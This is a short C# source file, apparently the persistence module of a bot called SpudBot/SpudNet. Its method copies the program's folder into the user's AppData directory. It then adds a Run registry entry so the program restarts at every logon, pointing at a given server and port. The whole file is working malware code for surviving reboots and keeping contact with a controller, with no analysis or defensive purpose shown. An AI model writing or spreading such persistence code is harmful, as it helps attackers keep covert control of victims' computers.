using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SpudBot
{
    class SpudOnStartup
    {
        public static string PersistanceSpud(string server, int port)
        {            
            string sourceDir = Environment.CurrentDirectory;
            string targetDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SpudNet\\";
            string dest = " \"" + server + "\"" + " \"" + port + "\"";
            string runCommand = targetDir + AppDomain.CurrentDomain.FriendlyName + dest;
            string status = "Success!";
            
            try { 
                void Copy(string source, string target)
                {
                    Directory.CreateDirectory(target);
                    foreach (var file in Directory.GetFiles(source))
                        File.Copy(file, Path.Combine(target, Path.GetFileName(file)));

                    foreach (var directory in Directory.GetDirectories(source))
                        Copy(directory, Path.Combine(target, Path.GetFileName(directory)));
                }
                if (!Directory.Exists(targetDir))
                {
                    Copy(sourceDir, targetDir);
                } 
            
                var registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                registryKey.SetValue("SpudNet", runCommand);
            } catch (Exception e)
            {
                status = e.ToString();
            }
            return status;
        }
    }
}